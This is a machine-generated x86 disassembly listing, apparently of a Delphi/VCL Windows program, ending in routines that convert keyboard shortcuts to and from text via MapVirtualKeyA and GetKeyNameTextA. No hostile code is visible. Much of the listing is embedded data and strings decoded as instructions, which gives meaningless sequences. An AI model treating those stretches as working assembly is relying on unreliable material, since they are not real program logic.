add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esp + ebx * 4 + 0x41 ] cl
xor al 0x40
outsb
je r-xdata
xor [ ebx + 0xd030044 ] ah
push esp
dec ebp
outsb
jne r-xdata
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ edx + edi * 2 + 0x34540044 ] ch
jne r-xdata
add [ ebp + esi * 4 - 0x637fffbc ] dl
inc ecx
add [ edi + esi * 4 - 0x634bffbc ] ch
inc ecx
add ah dh
mov eax 0x9c040044
outsd
sub_44a4e4
clc
push edx
push ecx
inc esp
fild [ eax + eax - 0x3c ]
fld [ eax + eax - 0x6c ]
fiadd [ eax + eax - 0x34 ]
fiadd [ eax + eax + 0x34 ]
fild [ eax + eax + 0x20 ]
fild [ eax + eax + 0x20 ]
fadd [ eax + eax + 0x9 ]
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0xe46b6365
mov [ 0x3b0044 ] al
add bh bh
push esp
0x10044 0x0
arpl [ ebx - 0x1c ] bp
insd
adc al 0xa5
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
add [ eax ] al
dec ebp
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
movsb [ edi ] [ esi ]
fadd [ eax + eax + 0x28 ]
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
js r-xdata
adc [ eax ] al
cmp eax 0x98ff0000
fild [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x146d6574
adc [ ecx ] al
pushad
add [ eax ] al
inc [ eax ]
fiadd [ eax + eax - 0x38 ]
dec ecx
outsb
js r-xdata
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
push [ eax - 0x27 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
popad
jae r-xdata
fiadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
in al 0x8a
inc esp
add [ eax + eax ] bh
push esp
loop r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
inc esp
add al ah
and al [ ecx ]
sbb [ eax ] al
add eax 0x756e654d
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
clc
fadd [ eax + eax + 0x48 ]
loope r-xdata
cmovno eax [ eax ]
push esp
add [ eax ] al
call [ eax + eax ]
dec [ eax + 0x44e1 ]
adc [ eax ] al
cmp al [ eax ]
add bh bh
in al dx
js r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
push [ eax + ebx * 8 ]
popad
jns r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] dh
inc ecx
add [ ecx + ebx * 8 - 0x21afffbc ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
mov cl ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
enter 0x44e1 0x0
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
push 0x44e1
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
jmp [ edx + ebx * 8 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
inc esp
add [ eax ] cl
loope r-xdata
add bh bh
xor al 0xd8
in al 0xa2
inc esp
add [ eax + eax ] bh
add bh bh
shr bl 0x1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc ecx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
call [ edx + ebx * 8 ]
inc esp
add al ch
loope r-xdata
outsd
dec ecx
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ eax + ebx * 8 - 0x1ed7ffbc ]
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44a0f870
add [ eax ] cl
add bh bh
and al 0xd8
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
xchg esp eax
mov ch 0x41
add [ eax ] ch
fiadd [ eax + eax - 0x40 ]
fiadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x3800419b ] al
in al dx
inc esp
add ah ah
hlt
pushad
cwde
jb r-xdata
fsubr [ eax - 0x56f7ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
cld
mov eax [ 0x980044 ]
add bh bh
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
xor al 0x40
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
adc [ ecx ] al
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
or dl ah
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
loope r-xdata
insd
adc al 0x10
inc ecx
add [ eax ] ah
add bh bh
add dl bl
inc esp
add al cl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc esp
add [ eax - 0x68 ] dl
dec ecx
je r-xdata
add dl ch
test al 0x44
add dh bh
test al 0x44
add [ eax ] bl
add [ eax ] al
in al 0x21
je r-xdata
cwde
insd
lea eax [ eax ]
pushfd
test al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
test al 0x44
add [ eax ] cl
test eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
0xfe0044a8 0x44a8
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add ah dl
in al dx
inc esp
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
add [ esi + edi - 0xb03ffbf ] bh
inc esp
add [ eax + 0x500044f5 ] bl
xor al 0x40
insd
je r-xdata
outsb
inc ebx
insb
adc al 0x0
pop es
dec edi
jae r-xdata
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sub_44a948
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ ecx + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44a965
test eax 0x600044
add [ eax ] al
push eax
test al 0x44
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add ah dl
in al dx
inc esp
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
add [ esi + edi - 0xb03ffbf ] bh
inc esp
add [ eax + 0x500044f5 ] bl
cwde
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x3800419b ] al
in al dx
inc esp
add ah ah
hlt
sub_44aabd
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
test al 0xab
jo r-xdata
outsb
je r-xdata
ja r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebp * 4 ] ah
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
and al 0xab
adc [ eax ] al
inc ecx
add [ eax ] al
call [ ecx + edi * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add al bl
xor [ eax ] eax
sub al 0x1
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
je r-xdata
outsb
je r-xdata
add al bl
stc
inc esp
add al ch
stc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc ebp
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
add [ esi + edi - 0xb03ffbf ] bh
inc esp
add [ eax + 0x500044f5 ] bl
cwde
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x47ffbe65 ] al
add [ ebp ] al
in al 0xf4
inc esp
add [ eax ] ch
in eax dx
inc esp
add [ esi * 8 + 0x1600044 ] dl
inc ebp
add [ eax ] bl
add al [ ebp ]
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
stosd [ edi ]
inc esp
add [ ebp - 0x538bffc0 ] cl
inc esp
outsd
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + eax ] ch
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
movsb [ edi ] [ esi ]
stosd [ edi ]
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
inc ebx
push 0x65676e61
nop
sub [ ebx + 0xf030044 ] ch
push esp
push eax
outsd
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
mov eax [ 0x500044 ]
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax - 0x37ffbb07 ] bh
stc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsd
adc [ esp + eax * 2 + 0x540e0600 ] ch
or eax 0x6f42616d
insd
je r-xdata
jne r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push 0x30044ab
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
inc ecx
add [ eax + 0x34 ] ah
inc eax
pushad
fwait
enter 0x44ac 0x0
pop es
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
pop es
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
stosd [ edi ]
add [ esp + edx * 4 + 0x34680041 ] dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ ebx + ebp * 4 + 0x408d0044 ] esp
add [ esp + ebp * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x780044ac ] bh
add [ eax ] al
add [ eax - 0x58 ] dl
inc esp
add [ eax - 0x65 ] ah
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
lodsb [ esi ]
inc esp
add [ eax ] al
je r-xdata
outsd
dec esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
push cs
push esp
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
and ah dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jo r-xdata
add [ ecx + eax + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc ebp
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
jo r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
call [ ecx + edi * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
in al 0x8a
inc esp
add [ eax ] cl
add bh bh
pop esp
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
inc ecx
add [ esp + esi + 0x40 ] dl
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
cmovno eax [ eax ]
je r-xdata
push cs
inc ecx
add [ eax ] dh
add [ eax ] al
inc [ eax - 0x7 ]
inc esp
add [ eax ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
ror [ edi ] 0x41
add [ ecx + eax + 0x45 ] dh
sub al 0xa3
inc esp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x44 ] ah
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
scasd [ edi ]
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] dh
inc edx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + 0x42 ] dh
add al bl
and [ edx ] eax
mov eax 0xa4004221
and [ edx ] eax
push cs
push esp
dec ebp
outsb
jne r-xdata
jo r-xdata
inc ebx
push 0x65676e61
sub al 0x10
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6465646f
stosd [ edi ]
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edi + esi + 0x39400041 ] bl
inc ecx
add [ eax ] ch
cmp eax [ ecx ]
add [ eax + 0x54004115 ] dh
xor al 0x40
outsb
cmp [ ecx + 0x500044 ] ah
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ ecx ] dl
inc ecx
jne r-xdata
lodsb [ esi ]
inc esp
add [ ecx + ebp * 4 ] al
inc esp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
rcr [ eax ] 0xaf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] ch
inc esp
add [ eax + eax ] dl
add [ eax ] al
mov al 0x15
inc ebx
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
sub al 0xa3
inc esp
add [ ebx + ebp * 4 ] ah
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43fcb8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44af21
aaa
inc ecx
add [ eax + edi + 0x41 ] ch
add [ eax ] dh
sti
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
je sub_44afa3
imul esi [ ebx + 0x74 ] 0x44af8490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80044af ] dl
add [ eax ] al
add [ eax ] dh
inc edx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ecx + 0x42 ] dh
add al bl
and [ edx ] eax
mov eax 0xa4004221
and [ edx ] eax
push cs
push esp
dec ebp
outsb
jne r-xdata
inc edx
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43fcb8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44afd0
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43a444
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43fcb8
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44b028
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44b060
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f5c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4041cc
sub_44b0b4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44b29d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ff4
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404144
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ff4
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403ff4
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404144
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404144
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f5c
mov eax esi
call sub_403f5c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403ff4
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407e94
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404268
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44b060
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404224
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ff4
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404224
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404224
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b2a4
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f80
retn
sub_44b2b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40421c
push eax
mov eax edi
call sub_40421c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40421c
push eax
mov eax edi
call sub_40441c
push eax
mov eax [ esi ]
call sub_40441c
pop edx
pop ecx
call sub_407c0c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40421c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044bc
sub_44b314
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40440c
xor eax eax
push ebp
push sub_44b3ef
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44b2b8
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44b2b8
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44b2b8
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44b2b8
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3f6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44b0b4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407bbc
